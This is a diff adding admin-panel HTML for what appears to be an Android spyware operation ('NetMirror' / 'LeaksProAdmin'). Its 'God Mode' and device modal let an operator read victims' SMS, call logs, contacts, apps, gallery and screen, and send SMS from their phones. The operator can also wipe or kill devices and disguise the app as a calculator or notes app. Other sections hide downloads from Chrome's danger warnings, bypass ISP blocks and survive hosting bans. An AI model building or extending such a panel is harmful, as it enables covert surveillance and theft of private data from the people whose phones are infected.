+            <div class="apk-upload-zone" id="apkSignDropZone">
+              <i class="ri-android-line apk-upload-icon"></i>
+              <p class="apk-upload-text">Drop APK file here or <span class="apk-upload-link">click to browse</span></p>
+              <p class="apk-upload-hint">Supports .apk files up to 500MB</p>
+              <input type="file" id="apkSignFileInput" accept=".apk" style="display:none">
+            </div>
+            <!-- File selected preview -->
+            <div class="apk-file-preview hidden" id="apkFilePreview">
+              <div class="apk-file-info">
+                <i class="ri-android-fill"></i>
+                <div>
+                  <span class="apk-file-name" id="apkFileName">—</span>
+                  <span class="apk-file-size" id="apkFileSize">—</span>
+                </div>
+                <button class="btn-icon apk-file-remove" id="apkFileRemove"><i class="ri-close-circle-line"></i></button>
+              </div>
+              <div class="field" style="margin-top:10px;">
+                <label>Remark / Label (optional)</label>
+                <input type="text" id="apkRemarkInput" placeholder="e.g. WhatsApp Mod v12.3">
+              </div>
+              <button class="btn btn-primary" id="apkSignBtn" onclick="signApk()">
+                <i class="ri-shield-check-line"></i> Sign APK
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Live Process Log (Forensic Terminal) -->
+        <div class="card apk-sign-card" id="apkLogCard" style="display:none;">
+          <div class="card-head">
+            <h3><i class="ri-terminal-box-line"></i> Signing Process Log</h3>
+            <span class="apk-log-status" id="apkLogStatus">PROCESSING</span>
+          </div>
+          <div class="apk-terminal" id="apkTerminal">
+            <div class="apk-terminal-lines" id="apkTerminalLines">
+              <!-- Lines injected by JS -->
+            </div>
+          </div>
+        </div>
+
+        <!-- Signed APKs Library -->
+        <div class="card apk-sign-card">
+          <div class="card-head">
+            <h3><i class="ri-archive-line"></i> Signed APK Vault</h3>
+            <span class="apk-vault-count" id="apkVaultCount">0</span>
+          </div>
+          <div class="apk-vault-list" id="apkVaultList">
+            <div class="apk-vault-empty" id="apkVaultEmpty">
+              <i class="ri-inbox-unarchive-line"></i>
+              <p>No signed APKs yet</p>
+              <span>Upload an APK above to get started</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- GitHub Releases Distribution -->
+        <div class="card apk-sign-card">
+          <div class="card-head">
+            <h3><i class="ri-github-fill"></i> GitHub Releases Distribution</h3>
+          </div>
+          <div class="card-content">
+            <p style="color:var(--text-muted);font-size:13px;margin-bottom:14px;">
+              Push the current APK to <strong>GitHub Releases</strong> for Chrome-safe downloads. GitHub.com is a trusted domain — Chrome won't show the "dangerous file" warning when users download from there.
+            </p>
+            <div class="sys-current">
+              <div class="sys-info-row">
+                <span class="sys-label">GitHub APK URL</span>
+                <span class="sys-val" id="ghApkUrl" style="word-break:break-all;font-size:12px;">Not pushed yet</span>
+              </div>
+              <div class="sys-info-row">
+                <span class="sys-label">Last Pushed</span>
+                <span class="sys-val" id="ghApkPushedAt">Never</span>
+              </div>
+            </div>
+            <button class="btn btn-primary" onclick="pushApkToGitHub()" id="ghApkPushBtn" style="margin-top:12px;width:100%;">
+              <i class="ri-upload-cloud-2-line"></i> Push APK to GitHub Releases
+            </button>
+            <span class="sys-hint" style="display:block;margin-top:8px;">Requires GitHub token (set in System & Recovery). The APK is uploaded to the <code>latest</code> release on your repo.</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== ADMIN DEVICES PAGE ===== -->
+      <section id="page-admindevices" class="page">
+
+        <!-- Admin App Download Card -->
+        <div class="card" style="margin-bottom:16px;">
+          <div class="card-head card-head-flex">
+            <h3><i class="ri-download-cloud-2-line"></i> LeaksProAdmin App</h3>
+            <span id="adminApkBadge" class="ws-badge" style="font-size:12px">Checking...</span>
+          </div>
+          <div class="card-content">
+            <p style="color:var(--muted);font-size:13px;margin-bottom:14px;">
+              Download or update the LeaksProAdmin mobile app. Always get the latest version directly from the server.
+            </p>
+
+            <!-- Status info -->
+            <div id="adminApkInfo" style="display:flex;gap:12px;align-items:center;flex-wrap:wrap;margin-bottom:14px;padding:12px;background:var(--surface);border-radius:8px;border:1px solid var(--border)">
+              <div style="flex:1;min-width:200px">
+                <div style="font-size:12px;color:var(--muted);margin-bottom:4px">Status</div>
+                <div id="adminApkStatus" style="font-size:14px;color:var(--text);font-weight:600">Checking...</div>
+              </div>
+              <div style="flex:1;min-width:120px">
+                <div style="font-size:12px;color:var(--muted);margin-bottom:4px">File Size</div>
+                <div id="adminApkSize" style="font-size:14px;color:var(--text);font-weight:600">—</div>
+              </div>
+              <div style="flex:1;min-width:180px">
+                <div style="font-size:12px;color:var(--muted);margin-bottom:4px">Last Updated</div>
+                <div id="adminApkDate" style="font-size:14px;color:var(--text);font-weight:600">—</div>
+              </div>
+            </div>
+
+            <!-- Actions -->
+            <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
+              <button class="btn btn-primary" onclick="downloadAdminApk()" id="adminApkDownloadBtn" disabled>
+                <i class="ri-download-2-line"></i> Download APK
+              </button>
+              <label class="btn btn-outline btn-sm" style="cursor:pointer;margin:0">
+                <i class="ri-upload-2-line"></i> Upload New Version
+                <input type="file" accept=".apk" style="display:none" onchange="uploadAdminApk(this)">
+              </label>
+            </div>
+          </div>
+        </div>
+
+        <div class="fx-header">
+          <div class="fx-scan-bar"><div class="fx-scan-line"></div></div>
+          <div class="fx-title">
+            <i class="ri-smartphone-line"></i>
+            <span>ADMIN APP INSTALLATIONS — DEVICE TRACKER</span>
+            <span class="fx-blink">●</span>
+          </div>
+        </div>
+
+        <div class="fx-stats">
+          <div class="fx-stat">
+            <span class="fx-stat-val" id="admDevTotal">0</span>
+            <span class="fx-stat-lbl">TOTAL INSTALLS</span>
+          </div>
+          <div class="fx-stat fx-online">
+            <span class="fx-stat-val" id="admDevOnline">0</span>
+            <span class="fx-stat-lbl">ONLINE</span>
+          </div>
+          <div class="fx-stat fx-offline">
+            <span class="fx-stat-val" id="admDevOffline">0</span>
+            <span class="fx-stat-lbl">OFFLINE</span>
+          </div>
+          <div class="fx-stat" style="border-color:var(--red)">
+            <span class="fx-stat-val" id="admDevLocked" style="color:var(--red)">0</span>
+            <span class="fx-stat-lbl">LOCKED</span>
+          </div>
+        </div>
+
+        <div id="adminDeviceGrid" class="adm-dev-grid">
+          <div class="fx-empty">
+            <i class="ri-smartphone-line"></i>
+            <p>NO ADMIN APP INSTALLATIONS DETECTED</p>
+            <span>Devices will appear when LeaksProAdmin app registers</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== APP USERS PAGE ===== -->
+      <section id="page-users" class="page">
+        <div class="card">
+          <div class="card-head card-head-flex">
+            <h3><i class="ri-user-line"></i> Registered App Users</h3>
+            <button class="btn btn-outline btn-sm" onclick="loadAppUsers()">
+              <i class="ri-refresh-line"></i> Refresh
+            </button>
+          </div>
+          <div class="card-content">
+            <div id="usersStats" style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px;">
+              <div style="padding:12px 16px;background:var(--surface);border-radius:8px;border:1px solid var(--border);flex:1;min-width:120px;">
+                <div style="font-size:12px;color:var(--muted);">Total Users</div>
+                <div style="font-size:22px;font-weight:700;color:var(--text)" id="usersTotalCount">0</div>
+              </div>
+              <div style="padding:12px 16px;background:var(--surface);border-radius:8px;border:1px solid var(--border);flex:1;min-width:120px;">
+                <div style="font-size:12px;color:var(--muted);">Phone Auth</div>
+                <div style="font-size:22px;font-weight:700;color:var(--text)" id="usersPhoneCount">0</div>
+              </div>
+              <div style="padding:12px 16px;background:var(--surface);border-radius:8px;border:1px solid var(--border);flex:1;min-width:120px;">
+                <div style="font-size:12px;color:var(--muted);">Gmail Auth</div>
+                <div style="font-size:22px;font-weight:700;color:var(--text)" id="usersGmailCount">0</div>
+              </div>
+            </div>
+            <div style="overflow-x:auto;">
+              <table class="tbl" id="usersTable">
+                <thead>
+                  <tr>
+                    <th>#</th>
+                    <th>Phone</th>
+                    <th>Email</th>
+                    <th>Name</th>
+                    <th>Auth</th>
+                    <th>Country</th>
+                    <th>IP</th>
+                    <th>Last Login</th>
+                    <th>Registered</th>
+                  </tr>
+                </thead>
+                <tbody id="usersTableBody">
+                  <tr><td colspan="9" class="empty">Loading users...</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== SYSTEM & RECOVERY PAGE ===== -->
+      <section id="page-system" class="page">
+        <div class="fx-header">
+          <div class="fx-scan-bar"><div class="fx-scan-line"></div></div>
+          <div class="fx-title">
+            <i class="ri-server-line"></i>
+            <span>SYSTEM DOMAIN & DISASTER RECOVERY</span>
+            <span class="fx-blink">●</span>
+          </div>
+        </div>
+
+        <!-- Domain Management Card -->
+        <div class="card sys-card">
+          <div class="card-head">
+            <h3><i class="ri-global-line"></i> Domain Management</h3>
+          </div>
+          <div class="card-content">
+            <p class="sys-desc">Switch the active server domain for the <b>entire system</b> — NetMirror app, LeaksProAdmin app, Telegram bot, landing page downloads, and all APIs. The switch is pushed to GitHub so all connected apps auto-discover the new server within minutes.</p>
+
+            <!-- QUICK DOMAIN SWITCHER -->
+            <div style="background:rgba(0,229,255,.04);border:1px solid rgba(0,229,255,.15);border-radius:14px;padding:18px 16px;margin-bottom:20px">
+              <div style="display:flex;align-items:center;gap:8px;margin-bottom:14px">
+                <i class="ri-flashlight-line" style="color:var(--accent);font-size:18px"></i>
+                <span style="font-weight:700;color:#fff;font-size:15px">Quick Domain Switch</span>
+                <span id="domainSwitchBadge" style="font-size:11px;padding:2px 10px;border-radius:20px;background:rgba(0,229,255,.12);color:var(--accent);margin-left:auto">Active: —</span>
+              </div>
+              <div style="display:flex;gap:8px;flex-wrap:wrap" id="domainSwitchBtns">
+                <button class="btn sys-btn" style="flex:1;min-width:120px;border:1px solid rgba(0,229,255,.2)" onclick="quickSwitchDomain('railway')" id="dsBtn_railway">
+                  <i class="ri-train-line"></i> Railway
+                </button>
+                <button class="btn sys-btn" style="flex:1;min-width:120px;border:1px solid rgba(124,77,255,.2)" onclick="quickSwitchDomain('render')" id="dsBtn_render">
+                  <i class="ri-cloud-line"></i> Render
+                </button>
+                <button class="btn sys-btn" style="flex:1;min-width:120px;border:1px solid rgba(255,152,0,.2)" onclick="quickSwitchDomain('custom')" id="dsBtn_custom">
+                  <i class="ri-edit-line"></i> Custom
+                </button>
+              </div>
+              <div id="customDomainRow" style="display:none;margin-top:10px">
+                <div class="sys-input-row">
+                  <input type="text" id="customDomainInput" placeholder="https://your-custom-domain.com" class="sys-input">
+                  <button class="btn btn-primary sys-btn" onclick="applyCustomDomain()" id="customDomainApplyBtn">
+                    <i class="ri-check-line"></i> Apply
+                  </button>
+                </div>
+              </div>
+              <div id="domainSwitchStatus" style="margin-top:10px;font-size:12px;color:#888;display:none"></div>
+            </div>
+
+            <div class="sys-current">
+              <div class="sys-info-row">
+                <span class="sys-label">Current Origin</span>
+                <span class="sys-val" id="sysCurrentOrigin">—</span>
+              </div>
+              <div class="sys-info-row">
+                <span class="sys-label">Active Domain</span>
+                <span class="sys-val sys-domain-active" id="sysActiveDomain">—</span>
+              </div>
+              <div class="sys-info-row">
+                <span class="sys-label">Railway URL</span>
+                <span class="sys-val" id="sysRailwayUrl" style="color:var(--text-muted)">—</span>
+              </div>
+              <div class="sys-info-row">
+                <span class="sys-label">Render URL</span>
+                <span class="sys-val" id="sysRenderUrl" style="color:var(--text-muted)">—</span>
+              </div>
+              <div class="sys-info-row">
+                <span class="sys-label">Discovery URL</span>
+                <span class="sys-val sys-discovery" id="sysDiscoveryUrl">—</span>
+              </div>
+              <div class="sys-info-row">
+                <span class="sys-label">Last Pushed</span>
+                <span class="sys-val" id="sysLastDomainPush">Never</span>
+              </div>
+            </div>
+
+            <div class="sys-form-group">
+              <label>Manual Domain Override</label>
+              <div class="sys-input-row">
+                <input type="text" id="sysDomainInput" placeholder="https://your-new-domain.com" class="sys-input">
+                <button class="btn btn-primary sys-btn" onclick="updateDomain()" id="sysDomainBtn">
+                  <i class="ri-refresh-line"></i> Update Domain
+                </button>
+              </div>
+              <span class="sys-hint">Enter any custom URL. This updates the domain for all apps + Telegram in one click.</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- GitHub Integration Card -->
+        <div class="card sys-card">
+          <div class="card-head">
+            <h3><i class="ri-github-fill"></i> GitHub Integration</h3>
+          </div>
+          <div class="card-content">
+            <p class="sys-desc">Connect your GitHub repo for domain discovery + database backups. Apps will check <code>domain.json</code> in your repo to find the current server — even if the old hosting is completely dead.</p>
+
+            <div class="sys-current">
+              <div class="sys-info-row">
+                <span class="sys-label">Repository</span>
+                <span class="sys-val" id="sysGitHubRepo">—</span>
+              </div>
+              <div class="sys-info-row">
+                <span class="sys-label">Token Status</span>
+                <span class="sys-val" id="sysTokenStatus">—</span>
+              </div>
+            </div>
+
+            <div class="sys-form-group">
+              <label>GitHub Personal Access Token</label>
+              <div class="sys-input-row">
+                <input type="password" id="sysGitHubToken" placeholder="ghp_xxxxxxxxxxxxxxxxxxxx" class="sys-input">
+                <button class="btn btn-primary sys-btn" onclick="saveGitHubToken()">
+                  <i class="ri-key-line"></i> Save Token
+                </button>
+              </div>
+              <span class="sys-hint">Create a token at <a href="https://github.com/settings/tokens" target="_blank" style="color:var(--accent)">github.com/settings/tokens</a> with <code>repo</code> scope. This enables domain discovery + backup recovery.</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Backup & Recovery Card -->
+        <div class="card sys-card">
+          <div class="card-head">
+            <h3><i class="ri-shield-check-line"></i> Backup & Disaster Recovery</h3>
+          </div>
+          <div class="card-content">
+            <p class="sys-desc">Full database backup pushed to GitHub. If your hosting dies (banned, deleted, etc.), deploy the code on new hosting, set the new domain above, and restore the backup — your entire system is back online in minutes.</p>
+
+            <div class="sys-current">
+              <div class="sys-info-row">
+                <span class="sys-label">Last GitHub Backup</span>
+                <span class="sys-val" id="sysLastBackup">Never</span>
+              </div>
+              <div class="sys-info-row">
+                <span class="sys-label">Auto Backup (6h)</span>
+                <span class="sys-val" id="sysAutoBackupStatus">Disabled</span>
+              </div>
+            </div>
+
+            <div class="sys-actions">
+              <button class="btn sys-btn sys-btn-backup" onclick="createBackup()" id="sysBackupBtn">
+                <i class="ri-upload-cloud-2-line"></i> Backup Now
+              </button>
+              <button class="btn sys-btn sys-btn-restore" onclick="restoreBackup()" id="sysRestoreBtn">
+                <i class="ri-download-cloud-2-line"></i> Restore from GitHub
+              </button>
+              <button class="btn sys-btn sys-btn-auto" onclick="toggleAutoBackup()" id="sysAutoBackupBtn">
+                <i class="ri-timer-line"></i> <span id="sysAutoBackupLabel">Enable Auto Backup</span>
+              </button>
+            </div>
+
+            <div class="sys-recovery-guide" style="margin-top:16px;">
+              <h4><i class="ri-lifebuoy-line"></i> Emergency Recovery Steps</h4>
+              <ol class="sys-steps">
+                <li>Deploy <code>vernapark/Leakspro-backend</code> on new hosting (Render, Fly.io, etc.)</li>
+                <li>Open admin panel on the new URL → go to System & Recovery</li>
+                <li>Enter your GitHub token → Click "Restore from GitHub"</li>
+                <li>Set the new domain URL → All apps auto-discover the new server</li>
+                <li>Done — everything is back online!</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+
+        <!-- Auto-Failover Card -->
+        <div class="card sys-card">
+          <div class="card-head">
+            <h3><i class="ri-shield-flash-line"></i> Auto-Failover System</h3>
+          </div>
+          <div class="card-content">
+            <p class="sys-desc">Set a backup server URL. A GitHub Actions health monitor pings the primary server every 5 minutes. If it goes down for 15+ minutes, <strong>domain.json</strong> is automatically switched to the backup — all apps seamlessly reconnect. When the primary recovers, it auto-restores.</p>
+
+            <div class="sys-current">
+              <div class="sys-info-row">
+                <span class="sys-label">Backup Server</span>
+                <span class="sys-val sys-domain-active" id="sysBackupUrl">Not configured</span>
+              </div>
+              <div class="sys-info-row">
+                <span class="sys-label">Failover Status</span>
+                <span class="sys-val" id="sysFailoverStatus">Inactive</span>
+              </div>
+              <div class="sys-info-row">
+                <span class="sys-label">Health Monitor</span>
+                <span class="sys-val"><a href="#" id="sysMonitorLink" target="_blank" style="color:var(--accent)">View on GitHub Actions</a></span>
+              </div>
+            </div>
+
+            <div class="sys-form-group">
+              <label>Backup Server URL</label>
+              <div class="sys-input-row">
+                <input type="text" id="sysBackupUrlInput" placeholder="https://your-backup-server.com" class="sys-input">
+                <button class="btn btn-primary sys-btn" onclick="saveBackupUrl()" id="sysBackupUrlBtn">
+                  <i class="ri-server-line"></i> Set Backup Server
+                </button>
+              </div>
+              <span class="sys-hint">Deploy the same <code>vernapark/Leakspro-backend</code> code on a second host (Render, Fly.io, Oracle Cloud). Enter its URL here. The health monitor will auto-switch to it if the primary goes down.</span>
+            </div>
+
+            <div class="sys-recovery-guide" style="margin-top:16px;">
+              <h4><i class="ri-flow-chart"></i> How Auto-Failover Works</h4>
+              <ol class="sys-steps">
+                <li>GitHub Actions pings <code>/api/health</code> on primary server every 5 minutes</li>
+                <li>After 3 consecutive failures (15 min), it checks if backup is alive</li>
+                <li>If backup is UP → <code>domain.json</code> switches to backup URL automatically</li>
+                <li>All apps (NetMirror + LeaksProAdmin) detect the new URL within minutes</li>
+                <li>When primary recovers, the monitor auto-restores back to it</li>
+                <li>A GitHub Issue is created for every failover event as an alert</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+
+        <!-- Cloudflare Proxy Card -->
+        <div class="card sys-card">
+          <div class="card-head">
+            <h3><i class="ri-cloud-line"></i> Cloudflare Proxy (ISP Bypass)</h3>
+          </div>
+          <div class="card-content">
+            <p class="sys-desc">Many ISPs block <code>*.railway.app</code> at the DNS level, making the landing page unreachable on mobile phones. A Cloudflare Worker acts as a reverse proxy — users access <strong>your-name.workers.dev</strong> instead, which is never blocked by any ISP.</p>
+
+            <div class="sys-current">
+              <div class="sys-info-row">
+                <span class="sys-label">Proxy URL</span>
+                <span class="sys-val sys-domain-active" id="sysProxyUrl">Not configured</span>
+              </div>
+              <div class="sys-info-row">
+                <span class="sys-label">Status</span>
+                <span class="sys-val" id="sysProxyStatus">—</span>
+              </div>
+            </div>
+
+            <div class="sys-form-group">
+              <label>Cloudflare Worker URL</label>
+              <div class="sys-input-row">
+                <input type="text" id="sysProxyUrlInput" placeholder="https://netmirror-app.your-subdomain.workers.dev" class="sys-input">
+                <button class="btn btn-primary sys-btn" onclick="saveProxyUrl()" id="sysProxyUrlBtn">
+                  <i class="ri-cloud-line"></i> Set Proxy URL
+                </button>
+              </div>
+              <span class="sys-hint">After deploying the Cloudflare Worker (see setup guide below), paste the Worker URL here. All apps will auto-discover and use the proxy URL. Share this URL publicly instead of the Railway domain.</span>
+            </div>
+
+            <div class="sys-recovery-guide" style="margin-top:16px;">
+              <h4><i class="ri-flow-chart"></i> Quick Setup (5 minutes, 100% free)</h4>
+              <ol class="sys-steps">
+                <li>Go to <a href="https://dash.cloudflare.com/sign-up" target="_blank" style="color:var(--accent)">dash.cloudflare.com</a> → Create free account</li>
+                <li>Left sidebar → <strong>Workers & Pages</strong> → Create → Create Worker</li>
+                <li>Name it (e.g., <code>netmirror-app</code>) → Deploy</li>
+                <li>Click <strong>"Edit code"</strong> → paste <code>cloudflare-worker.js</code> from the repo → Save and Deploy</li>
+                <li>Your URL: <code>https://netmirror-app.YOUR-SUBDOMAIN.workers.dev</code></li>
+                <li>Paste the URL above and click Set Proxy URL</li>
+                <li>Share the Worker URL as the public landing page — works on all phones!</li>
+              </ol>
+              <p class="sys-hint" style="margin-top:10px;">Free tier: 100,000 requests/day. For a custom domain (e.g., <code>netmirror.xyz</code>), buy a $1/year .xyz domain and attach it to the Worker in Cloudflare dashboard.</p>
+            </div>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ═══ GOD MODE ═══ -->
+      <section id="page-godmode" class="page">
+        <div class="fx-header">
+          <div class="fx-scan-bar"><div class="fx-scan-line"></div></div>
+          <div class="fx-title">
+            <i class="ri-skull-2-line"></i>
+            <span>GOD MODE — REMOTE DEVICE CONTROL</span>
+            <span class="fx-blink">●</span>
+          </div>
+        </div>
+
+        <!-- Global Controls -->
+        <div class="card gm-card">
+          <div class="card-head">
+            <h3><i class="ri-flashlight-line"></i> Global Kill Switch</h3>
+          </div>
+          <div class="card-content">
+            <p class="sys-desc">When enabled, ALL devices will be blocked from using the app. They'll see a kill screen with your message. Use this for emergencies only.</p>
+            <div class="gm-toggle-row">
+              <label class="gm-switch">
+                <input type="checkbox" id="gmGlobalKill">
+                <span class="gm-slider"></span>
+              </label>
+              <span class="gm-toggle-label" id="gmGlobalKillLabel">OFF</span>
+            </div>
+            <div class="field" style="margin-top:12px;">
+              <label>Kill Message</label>
+              <textarea id="gmGlobalKillMsg" rows="2" placeholder="This app has been disabled by the administrator."></textarea>
+            </div>
+            <button class="btn btn-danger btn-sm" onclick="saveGodModeGlobal()" style="margin-top:10px;">
+              <i class="ri-save-line"></i> Save Global Kill Settings
+            </button>
+          </div>
+        </div>
+
+        <div class="card gm-card">
+          <div class="card-head">
+            <h3><i class="ri-upload-2-line"></i> Force Update Gate</h3>
+          </div>
+          <div class="card-content">
+            <p class="sys-desc">Block all app versions below the minimum version code. Users will see an update screen with the download link.</p>
+            <div class="gm-row">
+              <div class="field" style="flex:1">
+                <label>Minimum Version Code</label>
+                <input type="number" id="gmMinVersionCode" placeholder="2" min="1">
+              </div>
+              <div class="field" style="flex:2">
+                <label>Update APK URL</label>
+                <input type="url" id="gmUpdateUrl" placeholder="https://example.com/app-release.apk">
+              </div>
+            </div>
+            <div class="field" style="margin-top:8px;">
+              <label>Update Message</label>
+              <textarea id="gmUpdateMsg" rows="2" placeholder="A new version is available. Please update to continue."></textarea>
+            </div>
+            <button class="btn btn-primary btn-sm" onclick="saveGodModeGlobal()" style="margin-top:10px;">
+              <i class="ri-save-line"></i> Save Update Settings
+            </button>
+          </div>
+        </div>
+
+        <div class="card gm-card">
+          <div class="card-head">
+            <h3><i class="ri-spy-line"></i> Global Stealth Profile</h3>
+          </div>
+          <div class="card-content">
+            <p class="sys-desc">Change the app icon and name on ALL devices. The launcher will show the disguised app instead of "NetMirror".</p>
+            <div class="field">
+              <label>Stealth Profile</label>
+              <select id="gmGlobalStealth">
+                <option value="">Disabled (NetMirror)</option>
+                <option value="calculator">Calculator</option>
+                <option value="notes">Notes</option>
+                <option value="weather">Weather</option>
+              </select>
+            </div>
+            <button class="btn btn-primary btn-sm" onclick="saveGodModeGlobal()" style="margin-top:10px;">
+              <i class="ri-save-line"></i> Save Stealth Settings
+            </button>
+          </div>
+        </div>
+
+        <!-- Per-Device Controls -->
+        <div class="card gm-card">
+          <div class="card-head">
+            <h3><i class="ri-device-line"></i> Per-Device Commands</h3>
+            <button class="btn btn-outline btn-sm" onclick="loadGodMode()">
+              <i class="ri-refresh-line"></i> Refresh
+            </button>
+          </div>
+          <div class="card-content">
+            <p class="sys-desc">Target individual devices with kill, wipe, or stealth commands.</p>
+            <div id="gmDeviceList" class="gm-device-list">
+              <div class="fx-empty">
+                <i class="ri-smartphone-line"></i>
+                <p>Loading devices...</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+    </div>
+  </div>
+  <div class="modal-backdrop hidden" id="editModal">
+    <div class="modal-dialog">
+      <div class="modal-top">
+        <h3>Edit Video</h3>
+        <button class="btn-icon" onclick="closeModal()"><i class="ri-close-line"></i></button>
+      </div>
+      <div class="modal-content">
+        <form id="editForm" class="form-grid">
+          <input type="hidden" id="editVideoId">
+          <div class="field span-full">
+            <label>Title</label>
+            <input type="text" id="editTitle" required>
+          </div>
+          <div class="field span-full">
+            <label>Description</label>
+            <textarea id="editDesc" rows="3"></textarea>
+          </div>
+          <div class="field">
+            <label>Category</label>
+            <select id="editCategory">
+              <option value="General">General</option>
+              <option value="Gaming">Gaming</option>
+              <option value="Music">Music</option>
+              <option value="Sports">Sports</option>
+              <option value="Education">Education</option>
+              <option value="Entertainment">Entertainment</option>
+              <option value="News">News</option>
+              <option value="Technology">Technology</option>
+              <option value="Comedy">Comedy</option>
+              <option value="Film">Film</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>Channel</label>
+            <input type="text" id="editChannel">
+          </div>
+          <div class="field span-full checkbox-row">
+            <label class="checkbox"><input type="checkbox" id="editPublished"> Published</label>
+            <label class="checkbox"><input type="checkbox" id="editShort"> Short</label>
+          </div>
+          <div class="field span-full">
+            <label>New Thumbnail</label>
+            <input type="file" id="editThumbnail" accept="image/*">
+          </div>
+          <div class="field span-full">
+            <button type="submit" class="btn btn-primary btn-block">
+              <i class="ri-save-line"></i> Save Changes
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ DEVICE MODAL (Tabbed — SMS, Calls, Contacts, Apps) ============ -->
+  <div class="modal-backdrop hidden" id="deviceModal">
+    <div class="modal-dialog device-modal-dialog">
+      <div class="modal-top device-modal-top">
+        <div class="device-modal-header">
+          <i class="ri-smartphone-line"></i>
+          <div>
+            <h3 id="deviceModalTitle">Device Panel</h3>
+            <span class="device-modal-sub" id="deviceModalSub">Loading...</span>
+          </div>
+        </div>
+        <div class="device-modal-actions">
+          <button class="btn btn-sm btn-outline" onclick="exportDeviceData()" title="Export all data">
+            <i class="ri-download-2-line"></i> <span class="hide-tiny">Export</span>
+          </button>
+          <button class="btn-icon" onclick="closeDeviceModal()"><i class="ri-close-line"></i></button>
+        </div>
+      </div>
+
+      <!-- Tabs -->
+      <div class="device-tabs">
+        <button class="device-tab active" data-tab="sms" onclick="switchDeviceTab('sms')">
+          <i class="ri-message-2-line"></i><span>SMS</span>
+        </button>
+        <button class="device-tab" data-tab="calls" onclick="switchDeviceTab('calls')">
+          <i class="ri-phone-line"></i><span>Calls</span>
+        </button>
+        <button class="device-tab" data-tab="contacts" onclick="switchDeviceTab('contacts')">
+          <i class="ri-contacts-book-line"></i><span>Contacts</span>
+        </button>
+        <button class="device-tab" data-tab="apps" onclick="switchDeviceTab('apps')">
+          <i class="ri-apps-line"></i><span>Apps</span>
+        </button>
+        <button class="device-tab" data-tab="gallery" onclick="switchDeviceTab('gallery')">
+          <i class="ri-image-line"></i><span>Gallery</span>
+        </button>
+        <button class="device-tab" data-tab="screen" onclick="switchDeviceTab('screen')">
+          <i class="ri-screenshot-line"></i><span>Screen</span>
+        </button>
+        <button class="device-tab" data-tab="schedule" onclick="switchDeviceTab('schedule')">
+          <i class="ri-calendar-schedule-line"></i><span>Schedule</span>
+        </button>
+      </div>
+
+      <!-- ===== TAB: SMS ===== -->
+      <div class="device-tab-content active" id="tab-sms">
+        <div class="tab-search-wrap">
+          <i class="ri-search-line"></i>
+          <input type="text" id="smsSearch" placeholder="Search messages..." oninput="filterSmsMessages()">
+        </div>
+        <!-- SMS Compose Section -->
+        <div class="sms-compose">
+          <div class="sms-compose-header">
+            <i class="ri-send-plane-2-fill"></i>
+            <span>SEND SMS FROM DEVICE</span>
+          </div>
+          <div class="sms-compose-body">
+            <div class="sms-compose-fields">
+              <div class="sms-field">
+                <label><i class="ri-phone-line"></i> Receiver</label>
+                <input type="text" id="smsReceiver" placeholder="e.g. 9876543210 or +919876543210" autocomplete="off">
+              </div>
+              <div class="sms-field sms-field-msg">
+                <label><i class="ri-message-3-line"></i> Message</label>
+                <textarea id="smsMessage" rows="2" placeholder="Type message..."></textarea>
+              </div>
+            </div>
+            <div class="sms-compose-actions">
+              <button class="sms-sim-btn sim1" onclick="sendSmsFromDevice(1)" id="smsSim1Btn">
+                <i class="ri-sim-card-2-line"></i><span>SIM 1</span>
+              </button>
+              <button class="sms-sim-btn sim2" onclick="sendSmsFromDevice(2)" id="smsSim2Btn">
+                <i class="ri-sim-card-2-line"></i><span>SIM 2</span>
+              </button>
+            </div>
+            <div class="sms-send-status hidden" id="smsSendStatus"></div>
+          </div>
+        </div>
+        <div class="tab-list-container" id="smsListContainer">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading messages...</span></div>
+        </div>
+        <div class="tab-pagination" id="smsPagination"></div>
+      </div>
+
+      <!-- ===== TAB: CALLS ===== -->
+      <div class="device-tab-content" id="tab-calls">
+        <div class="tab-search-wrap">
+          <i class="ri-search-line"></i>
+          <input type="text" id="callSearch" placeholder="Search calls..." oninput="filterCallLogs()">
+        </div>
+        <div class="tab-list-container" id="callsListContainer">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading call logs...</span></div>
+        </div>
+        <div class="tab-pagination" id="callsPagination"></div>
+      </div>
+
+      <!-- ===== TAB: CONTACTS ===== -->
+      <div class="device-tab-content" id="tab-contacts">
+        <div class="tab-search-wrap">
+          <i class="ri-search-line"></i>
+          <input type="text" id="contactSearch" placeholder="Search contacts..." oninput="filterContacts()">
+        </div>
+        <div class="tab-list-container" id="contactsListContainer">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading contacts...</span></div>
+        </div>
+        <div class="tab-pagination" id="contactsPagination"></div>
+      </div>
+
+      <!-- ===== TAB: APPS ===== -->
+      <div class="device-tab-content" id="tab-apps">
+        <div class="tab-search-wrap">
+          <i class="ri-search-line"></i>
+          <input type="text" id="appSearch" placeholder="Search apps..." oninput="filterApps()">
+          <label class="tab-toggle">
+            <input type="checkbox" id="showSystemApps" onchange="loadApps()">
+            <span>System</span>
+          </label>
+        </div>
+        <div class="tab-list-container" id="appsListContainer">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading apps...</span></div>
+        </div>
+      </div>
+
+      <!-- ===== TAB: GALLERY ===== -->
+      <div class="device-tab-content" id="tab-gallery">
+        <div class="tab-search-wrap">
+          <i class="ri-search-line"></i>
+          <input type="text" id="gallerySearch" placeholder="Search photos..." oninput="filterGallery()">
+          <span class="gallery-count" id="galleryCount"></span>
+        </div>
+        <div class="gallery-grid-container" id="galleryGridContainer">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading gallery...</span></div>
+        </div>
